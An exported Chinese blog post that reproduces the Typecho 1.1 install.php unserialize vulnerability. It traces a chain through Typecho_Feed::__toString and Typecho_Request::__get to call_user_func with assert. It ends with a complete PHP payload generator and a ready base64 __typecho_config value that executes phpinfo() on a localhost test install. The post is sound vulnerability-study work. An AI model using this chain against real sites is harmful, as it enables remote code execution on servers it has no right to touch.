{"title":"Typecho1.1反序列化复现","uid":"10d60eae5b46a090616c469686df0945","slug":"Typecho1-1反序列化复现","date":"2022-10-17T11:42:19.000Z","updated":"2023-04-21T11:17:00.692Z","comments":true,"path":"api/articles/Typecho1-1反序列化复现.json","keywords":null,"cover":[],"content":"<meta name=\"referrer\" content=\"no-referrer\"/>\n\n<h1 id=\"参考资料：\"><a href=\"#参考资料：\" class=\"headerlink\" title=\"参考资料：\"></a>参考资料：</h1><p><a href=\"https://github.com/aleenzz/php_bug_wiki/blob/master/1.9.%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%A1%E8%AE%A1.md\">https://github.com/aleenzz/php_bug_wiki/blob/master/1.9.%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%A1%E8%AE%A1.md</a></p>\n<h1 id=\"复现：\"><a href=\"#复现：\" class=\"headerlink\" title=\"复现：\"></a>复现：</h1><p>常见的博客系统，在1.1版本的install.php文件中存在反序列化漏洞</p>\n<p>阅读index.php，在没有安装时，会默认跳转到install.php执行</p>\n<p>在install.php中，想要到达unserialize触发点，必须先进行博客安装，才会生成/config.inc.php</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&#x2F;&#x2F;判断是否已经安装\nif (!isset($_GET[&#39;finish&#39;]) &amp;&amp; file_exists(__TYPECHO_ROOT_DIR__ . &#39;&#x2F;config.inc.php&#39;) &amp;&amp; empty($_SESSION[&#39;typecho&#39;])) &#123;\n    exit;\n&#125;\n\n&#x2F;&#x2F; 挡掉可能的跨站请求\nif (!empty($_GET) || !empty($_POST)) &#123;\n    if (empty($_SERVER[&#39;HTTP_REFERER&#39;])) &#123;\n        exit;\n    &#125;\n\n    $parts &#x3D; parse_url($_SERVER[&#39;HTTP_REFERER&#39;]);\n\tif (!empty($parts[&#39;port&#39;])) &#123; &#x2F;&#x2F;port不为空执行\n        $parts[&#39;host&#39;] &#x3D; &quot;&#123;$parts[&#39;host&#39;]&#125;:&#123;$parts[&#39;port&#39;]&#125;&quot;;\n    &#125;\n\n    if (empty($parts[&#39;host&#39;]) || $_SERVER[&#39;HTTP_HOST&#39;] !&#x3D; $parts[&#39;host&#39;]) &#123;&#x2F;&#x2F;看是否来自于自身的连接\n        exit;\n    &#125;\n&#125;</code></pre>\n\n<p>get请求携带finish参数，进行了安装，session中不存在typecho的值，就会执行下面的代码</p>\n<p>后面部分代码就是一些函数，直接看unserialize触发点</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&lt;?php if (isset($_GET[&#39;finish&#39;])) : ?&gt;\n                &lt;?php if (!@file_exists(__TYPECHO_ROOT_DIR__ . &#39;&#x2F;config.inc.php&#39;)) : ?&gt;\n                &lt;h1 class&#x3D;&quot;typecho-install-title&quot;&gt;&lt;?php _e(&#39;安装失败!&#39;); ?&gt;&lt;&#x2F;h1&gt;\n                &lt;div class&#x3D;&quot;typecho-install-body&quot;&gt;\n                    &lt;form method&#x3D;&quot;post&quot; action&#x3D;&quot;?config&quot; name&#x3D;&quot;config&quot;&gt;\n                    &lt;p class&#x3D;&quot;message error&quot;&gt;&lt;?php _e(&#39;您没有上传 config.inc.php 文件，请您重新安装！&#39;); ?&gt; &lt;button class&#x3D;&quot;btn primary&quot; type&#x3D;&quot;submit&quot;&gt;&lt;?php _e(&#39;重新安装 &amp;raquo;&#39;); ?&gt;&lt;&#x2F;button&gt;&lt;&#x2F;p&gt;\n                    &lt;&#x2F;form&gt;\n                &lt;&#x2F;div&gt;\n                &lt;?php elseif (!Typecho_Cookie::get(&#39;__typecho_config&#39;)): ?&gt;\n                &lt;h1 class&#x3D;&quot;typecho-install-title&quot;&gt;&lt;?php _e(&#39;没有安装!&#39;); ?&gt;&lt;&#x2F;h1&gt;\n                &lt;div class&#x3D;&quot;typecho-install-body&quot;&gt;\n                    &lt;form method&#x3D;&quot;post&quot; action&#x3D;&quot;?config&quot; name&#x3D;&quot;config&quot;&gt;\n                    &lt;p class&#x3D;&quot;message error&quot;&gt;&lt;?php _e(&#39;您没有执行安装步骤，请您重新安装！&#39;); ?&gt; &lt;button class&#x3D;&quot;btn primary&quot; type&#x3D;&quot;submit&quot;&gt;&lt;?php _e(&#39;重新安装 &amp;raquo;&#39;); ?&gt;&lt;&#x2F;button&gt;&lt;&#x2F;p&gt;\n                    &lt;&#x2F;form&gt;\n                &lt;&#x2F;div&gt;\n                &lt;?php else : ?&gt;\n                    &lt;?php\n                    $config &#x3D; unserialize(base64_decode(Typecho_Cookie::get(&#39;__typecho_config&#39;)));\n                    Typecho_Cookie::delete(&#39;__typecho_config&#39;);\n                    $db &#x3D; new Typecho_Db($config[&#39;adapter&#39;], $config[&#39;prefix&#39;]);\n                    $db-&gt;addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);\n                    Typecho_Db::set($db);\n                    ?&gt;</code></pre>\n\n<p>和前面一样，需要存在finish，已经安装，并且通过get函数获取了__typecho_config</p>\n<p>这个值。看一下get函数</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&#x2F;**\n     * 获取指定的COOKIE值\n     *\n     * @access public\n     * @param string $key 指定的参数\n     * @param string $default 默认的参数\n     * @return mixed\n     *&#x2F;\n    public static function get($key, $default &#x3D; NULL)\n    &#123;\n        $key &#x3D; self::$_prefix . $key;\n        $value &#x3D; isset($_COOKIE[$key]) ? $_COOKIE[$key] : (isset($_POST[$key]) ? $_POST[$key] : $default);\n        return is_array($value) ? $default : $value;\n    &#125;</code></pre>\n\n<p>$_prefix默认设置为空，看cookie里面是否有__typecho_config的值。如果没有，看这个值在post里面有没有。有则看是否为数组，不是数组则返回该值。</p>\n<p>然后就会执行到触发点</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&lt;?php\n$config &#x3D; unserialize(base64_decode(Typecho_Cookie::get(&#39;__typecho_config&#39;)));\nTypecho_Cookie::delete(&#39;__typecho_config&#39;);\n$db &#x3D; new Typecho_Db($config[&#39;adapter&#39;], $config[&#39;prefix&#39;]);\n$db-&gt;addServer($config, Typecho_Db::READ | Typecho_Db::WRITE);\nTypecho_Db::set($db);\n?&gt;</code></pre>\n\n<p>对获取到的__typecho_config的值进行base64解码，并将它进行反序列化。</p>\n<p>到这里就有点懵逼，看了下大佬的教程，接下来需要找可以利用的魔术方法</p>\n<p>一般找析构函数__destruct()，全局搜索，函数用来unset值，和fclose关闭文件</p>\n<p>然后看下面代码，获取$config里面的adapter的值，和prefix的值，来实例化一个Typecho_Db对象，看一下这个类的构造函数能不能利用</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&#x2F;**\n     * 数据库类构造函数\n     *\n     * @param mixed $adapterName 适配器名称\n     * @param string $prefix 前缀\n     * @throws Typecho_Db_Exception\n     *&#x2F;\n    public function __construct($adapterName, $prefix &#x3D; &#39;typecho_&#39;)\n    &#123;\n        &#x2F;** 获取适配器名称 *&#x2F;\n        $this-&gt;_adapterName &#x3D; $adapterName;\n\n        &#x2F;** 数据库适配器 *&#x2F;\n        $adapterName &#x3D; &#39;Typecho_Db_Adapter_&#39; . $adapterName;\n\n        if (!call_user_func(array($adapterName, &#39;isAvailable&#39;))) &#123;\n            throw new Typecho_Db_Exception(&quot;Adapter &#123;$adapterName&#125; is not available&quot;);\n        &#125;\n\n        $this-&gt;_prefix &#x3D; $prefix;\n\n        &#x2F;** 初始化内部变量 *&#x2F;\n        $this-&gt;_pool &#x3D; array();\n        $this-&gt;_connectedPool &#x3D; array();\n        $this-&gt;_config &#x3D; array();\n\n        &#x2F;&#x2F;实例化适配器对象\n        $this-&gt;_adapter &#x3D; new $adapterName();\n    &#125;</code></pre>\n\n<p>prefix就是一个头参数，直接使用默认的就行。而adapter将会进行字符串连接，当adapter是一个类的时候，用 . 连接会触发这个类的__ toString 魔术方法。全局搜索 __ toString()</p>\n<p>有三个使用了，最后找到Feed.php中的__toString方法</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&#x2F;**\n     * 输出字符串\n     *\n     * @access public\n     * @return string\n     *&#x2F;\n    public function __toString()\n    &#123;\n        $result &#x3D; &#39;&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;&#39; . $this-&gt;_charset . &#39;&quot;?&gt;&#39; . self::EOL;\n\n        if (self::RSS1 &#x3D;&#x3D; $this-&gt;_type) &#123;\n            $result .&#x3D; &#39;&lt;rdf:RDF\nxmlns:rdf&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;1999&#x2F;02&#x2F;22-rdf-syntax-ns#&quot;\nxmlns&#x3D;&quot;http:&#x2F;&#x2F;purl.org&#x2F;rss&#x2F;1.0&#x2F;&quot;\nxmlns:dc&#x3D;&quot;http:&#x2F;&#x2F;purl.org&#x2F;dc&#x2F;elements&#x2F;1.1&#x2F;&quot;&gt;&#39; . self::EOL;\n\n            $content &#x3D; &#39;&#39;;\n            $links &#x3D; array();\n            $lastUpdate &#x3D; 0;\n\n            foreach ($this-&gt;_items as $item) &#123;\n                $content .&#x3D; &#39;&lt;item rdf:about&#x3D;&quot;&#39; . $item[&#39;link&#39;] . &#39;&quot;&gt;&#39; . self::EOL;\n                $content .&#x3D; &#39;&lt;title&gt;&#39; . htmlspecialchars($item[&#39;title&#39;]) . &#39;&lt;&#x2F;title&gt;&#39; . self::EOL;\n                $content .&#x3D; &#39;&lt;link&gt;&#39; . $item[&#39;link&#39;] . &#39;&lt;&#x2F;link&gt;&#39; . self::EOL;\n                $content .&#x3D; &#39;&lt;dc:date&gt;&#39; . $this-&gt;dateFormat($item[&#39;date&#39;]) . &#39;&lt;&#x2F;dc:date&gt;&#39; . self::EOL;\n                $content .&#x3D; &#39;&lt;description&gt;&#39; . strip_tags($item[&#39;content&#39;]) . &#39;&lt;&#x2F;description&gt;&#39; . self::EOL;\n                if (!empty($item[&#39;suffix&#39;])) &#123;\n                    $content .&#x3D; $item[&#39;suffix&#39;];\n                &#125;\n                $content .&#x3D; &#39;&lt;&#x2F;item&gt;&#39; . self::EOL;\n\n                $links[] &#x3D; $item[&#39;link&#39;];\n\n                if ($item[&#39;date&#39;] &gt; $lastUpdate) &#123;\n                    $lastUpdate &#x3D; $item[&#39;date&#39;];\n                &#125;\n            &#125;\n</code></pre>\n\n<p>很长，跳过一段</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"> else if (self::RSS2 &#x3D;&#x3D; $this-&gt;_type) &#123;\n            $result .&#x3D; &#39;&lt;rss version&#x3D;&quot;2.0&quot;\nxmlns:content&#x3D;&quot;http:&#x2F;&#x2F;purl.org&#x2F;rss&#x2F;1.0&#x2F;modules&#x2F;content&#x2F;&quot;\nxmlns:dc&#x3D;&quot;http:&#x2F;&#x2F;purl.org&#x2F;dc&#x2F;elements&#x2F;1.1&#x2F;&quot;\nxmlns:slash&#x3D;&quot;http:&#x2F;&#x2F;purl.org&#x2F;rss&#x2F;1.0&#x2F;modules&#x2F;slash&#x2F;&quot;\nxmlns:atom&#x3D;&quot;http:&#x2F;&#x2F;www.w3.org&#x2F;2005&#x2F;Atom&quot;\nxmlns:wfw&#x3D;&quot;http:&#x2F;&#x2F;wellformedweb.org&#x2F;CommentAPI&#x2F;&quot;&gt;\n&lt;channel&gt;&#39; . self::EOL;\n\n            $content &#x3D; &#39;&#39;;\n            $lastUpdate &#x3D; 0;\n\n            foreach ($this-&gt;_items as $item) &#123;\n                $content .&#x3D; &#39;&lt;item&gt;&#39; . self::EOL;\n                $content .&#x3D; &#39;&lt;title&gt;&#39; . htmlspecialchars($item[&#39;title&#39;]) . &#39;&lt;&#x2F;title&gt;&#39; . self::EOL;\n                $content .&#x3D; &#39;&lt;link&gt;&#39; . $item[&#39;link&#39;] . &#39;&lt;&#x2F;link&gt;&#39; . self::EOL;\n                $content .&#x3D; &#39;&lt;guid&gt;&#39; . $item[&#39;link&#39;] . &#39;&lt;&#x2F;guid&gt;&#39; . self::EOL;\n                $content .&#x3D; &#39;&lt;pubDate&gt;&#39; . $this-&gt;dateFormat($item[&#39;date&#39;]) . &#39;&lt;&#x2F;pubDate&gt;&#39; . self::EOL;\n                $content .&#x3D; &#39;&lt;dc:creator&gt;&#39; . htmlspecialchars($item[&#39;author&#39;]-&gt;screenName) . &#39;&lt;&#x2F;dc:creator&gt;&#39; . self::EOL;\n</code></pre>\n\n<p>在这里当，_type为RSS2也就是’RSS 2.0‘时，会执行$item[‘author’]-&gt;screenName</p>\n<p>这里如果，author值是一个类，并且screenName是一个私有或者没有定义的值就会触发该类的__get()方法。接下来就是找__get()方法</p>\n<p>在var/typecho/request.php中有个__get()方法</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&#x2F;**\n    * 获取实际传递参数(magic)\n    *\n    * @access public\n    * @param string $key 指定参数\n    * @return mixed\n    *&#x2F;\n   public function __get($key)\n   &#123;\n       return $this-&gt;get($key);\n   &#125;</code></pre>\n\n<p>这个方法调用了get函数</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&#x2F;**\n     * 获取实际传递参数\n     *\n     * @access public\n     * @param string $key 指定参数\n     * @param mixed $default 默认参数 (default: NULL)\n     * @return mixed\n     *&#x2F;\n    public function get($key, $default &#x3D; NULL)\n    &#123;\n        switch (true) &#123;\n            case isset($this-&gt;_params[$key]):\n                $value &#x3D; $this-&gt;_params[$key];\n                break;\n            case isset(self::$_httpParams[$key]):\n                $value &#x3D; self::$_httpParams[$key];\n                break;\n            default:\n                $value &#x3D; $default;\n                break;\n        &#125;\n\n        $value &#x3D; !is_array($value) &amp;&amp; strlen($value) &gt; 0 ? $value : $default;\n        return $this-&gt;_applyFilter($value);\n    &#125;\n</code></pre>\n\n<p>就是判断有没有设置$_params[‘screenName’]的值，或是$_httpParams[‘screenName’]的值，接下来赋值给$value，然后就是调用_applyFilter函数</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&#x2F;**\n     * 应用过滤器\n     *\n     * @access private\n     * @param mixed $value\n     * @return mixed\n     *&#x2F;\n    private function _applyFilter($value)\n    &#123;\n        if ($this-&gt;_filter) &#123;\n            foreach ($this-&gt;_filter as $filter) &#123;\n                $value &#x3D; is_array($value) ? array_map($filter, $value) :\n                call_user_func($filter, $value);\n            &#125;\n\n            $this-&gt;_filter &#x3D; array();\n        &#125;\n\n        return $value;\n    &#125;</code></pre>\n\n<p>判断赋值的value是不是数组，是数组通过array_map进行过滤函数调用，不是数组就是用call_user_func进行过滤函数调用。很奇怪前面经过判断，$value是数组的话，就会赋值成空。这里应该是其他地方也使用了这个函数，所以逻辑严谨一点，才会对$value的类型进行了判断。</p>\n<p>这里的$_filter和前面的$_params都是可控的内部参数，只需要将$_filter设置为代码执行函数，$_params[‘screenName’]设置为需要执行的代码。通过call_user_func来执行代码。</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">&lt;?php\n\nclass Typecho_Request&#123;\n    &#x2F;&#x2F;$_params数组里有screenName则会取用$_params里的值，赋给$value\n    private $_params&#x3D;array(&#39;screenName&#39;&#x3D;&gt;&#39;eval(\\&#39;phpinfo();exit();\\&#39;)&#39;);\n    &#x2F;&#x2F;通过过滤函数，过滤$value的值\n    private $_filter&#x3D;array(&#39;assert&#39;);\n&#125;\n\nclass Typecho_Feed&#123;\n    private $_type &#x3D; &#39;RSS 2.0&#39;;&#x2F;&#x2F;需要其通过前面的判断\n    private $_items;\n    public function __construct()\n    &#123;\n        $this-&gt;_items[]&#x3D;array(&#39;author&#39;&#x3D;&gt;new Typecho_Request());\n    &#125;\n&#125;\n&#x2F;&#x2F;接下来就是实例化Typecho_Feed对象，赋值给adapter\n&#x2F;&#x2F;通过反序列化，取adapter的值\n&#x2F;&#x2F;adapter是对象，触发Typecho_Feed的__toString方法\n&#x2F;&#x2F;获取author的screenName的值，author是Typecho_Request对象，且screenName是私有的\n&#x2F;&#x2F;触发Typecho_Request的__get()方法，通过call_user_func命令执行\n$payload &#x3D; array(&#39;adapter&#39;&#x3D;&gt;new Typecho_Feed());\n&#x2F;&#x2F;反序列化前进行了base64解码，所以需要编码\necho base64_encode(serialize($payload));\n&#x2F;&#x2F;http:&#x2F;&#x2F;127.0.0.1:8082&#x2F;install.php?finish&#x3D;11111\n&#x2F;&#x2F;Referer需要是从自身来的：http:&#x2F;&#x2F;127.0.0.1:8082&#x2F;install.php\n&#x2F;&#x2F;__typecho_config&#x3D;YToxOntzOjc6ImFkYXB0ZXIiO086MTI6IlR5cGVjaG9fRmVlZCI6Mjp7czoxOToiAFR5cGVjaG9fRmVlZABfdHlwZSI7czo3OiJSU1MgMi4wIjtzOjIwOiIAVHlwZWNob19GZWVkAF9pdGVtcyI7YToxOntzOjY6ImF1dGhvciI7TzoxNToiVHlwZWNob19SZXF1ZXN0IjoyOntzOjI0OiIAVHlwZWNob19SZXF1ZXN0AF9wYXJhbXMiO2E6MTp7czoxMDoic2NyZWVuTmFtZSI7czoyNToiZXZhbCgncGhwaW5mbygpO2V4aXQoKTsnKSI7fXM6MjQ6IgBUeXBlY2hvX1JlcXVlc3QAX2ZpbHRlciI7YToxOntpOjA7czo2OiJhc3NlcnQiO319fX19\n?&gt;</code></pre>\n\n<p>$_filter默认是空数组，这里使用foreach，遍历取值，所以payload中$_filter=array(‘assert’); 还在奇怪为什么传入数组到call_user_func。传入数组到call_user_func的回调参数，是使用某个类的某个方法，一般形式是</p>\n<p>call_user_func(array(‘a’,’b’),’xxxx’);</p>\n<p><strong>为什么这里payload</strong> *<em>phpinfo();exit();<strong><strong>中有</strong></strong>exit()</em>* <strong>,因为程序开始使用了****ob_start()</strong> <strong>这个函数会把输出放进缓冲区，触发异常后****ob_end_clean()</strong> <strong>会清空缓冲区，导致没有回显。所以可以找到个函数来跳出或者执行后我们报错跳出又或者直接不要回显写入一句话。</strong></p>\n<p><strong>测试一下：</strong></p>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2022/png/25696976/1666005704355-29629961-9e8d-4453-8e06-20559d26388c.png?x-oss-process=image/resize,w_937,limit_0\" alt=\"image.png\"></p>\n<p>成功</p>\n<p>直接使用上面注释里的__typecho_config会报错，原因是_items应该写成_items[]</p>\n<h2 id=\"小结：\"><a href=\"#小结：\" class=\"headerlink\" title=\"小结：\"></a>小结：</h2><p>感觉跟这种还是很吃力，不过跟一遍下来收获真挺大的</p>\n<p>反序列化的利用过程，各种利用思路，还有各种魔术方法的运用</p>\n","text":" 参考资料：https://github.com/aleenzz/php_bug_wiki/blob/master/1.9.%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%A1%E8%AE%A1.md 复现：常见的博客系统，在1.1版本的in...","link":"","photos":[],"count_time":{"symbolsCount":"13k","symbolsTime":"12 mins."},"categories":[{"name":"PHP反序列化","slug":"PHP反序列化","count":1,"path":"api/categories/PHP反序列化.json"}],"tags":[{"name":"PHP","slug":"PHP","count":7,"path":"api/tags/PHP.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99%EF%BC%9A\"><span class=\"toc-text\">参考资料：</span></a></li><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E5%A4%8D%E7%8E%B0%EF%BC%9A\"><span class=\"toc-text\">复现：</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-2\"><a class=\"toc-link\" href=\"#%E5%B0%8F%E7%BB%93%EF%BC%9A\"><span class=\"toc-text\">小结：</span></a></li></ol></li></ol>","author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个不想开挂的安全实习生","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}},"mapped":true,"prev_post":{"title":"5.0-5.0.23RCE漏洞复现","uid":"02bb8134dce40015108a5a765c734167","slug":"TP5-0-5-0-23RCE","date":"2022-10-19T13:20:47.000Z","updated":"2023-04-21T11:15:53.065Z","comments":true,"path":"api/articles/TP5-0-5-0-23RCE.json","keywords":null,"cover":[],"text":" 参考文章：https://mp.weixin.qq.com/s/DGWuSdB2DvJszom0C_dkoQ https://y4tacker.blog.csdn.net/article/details/115893304 https://mp.weixin.qq.com/s/...","link":"","photos":[],"count_time":{"symbolsCount":"29k","symbolsTime":"26 mins."},"categories":[{"name":"RCE","slug":"RCE","count":2,"path":"api/categories/RCE.json"}],"tags":[{"name":"thinphp","slug":"thinphp","count":1,"path":"api/tags/thinphp.json"}],"author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个不想开挂的安全实习生","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}},"next_post":{"title":"Java反序列化9笔记","uid":"fc0657b8e278d4cdd3f372956d7c0f2c","slug":"Java反序列化9笔记","date":"2022-09-16T11:41:59.000Z","updated":"2023-04-21T11:19:14.245Z","comments":true,"path":"api/articles/Java反序列化9笔记.json","keywords":null,"cover":[],"text":" 参考文章：p牛 Java安全漫谈19 https://t.zsxq.com/06mmMZrFu Object Serialization Stream Protocol https://docs.oracle.com/javase/8/docs/platform/seriali...","link":"","photos":[],"count_time":{"symbolsCount":"6.5k","symbolsTime":"6 mins."},"categories":[{"name":"Java安全","slug":"Java安全","count":11,"path":"api/categories/Java安全.json"}],"tags":[{"name":"Java","slug":"Java","count":22,"path":"api/tags/Java.json"}],"author":{"name":"Longw","slug":"blog-author","avatar":"https://userblink.csdnimg.cn/20211213/qq_57037477/pic/7db9b5c05ba342a75ddf06eecf740949-0.jpg","link":"/","description":"一个不想开挂的安全实习生","socials":{"github":"","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{}}}}}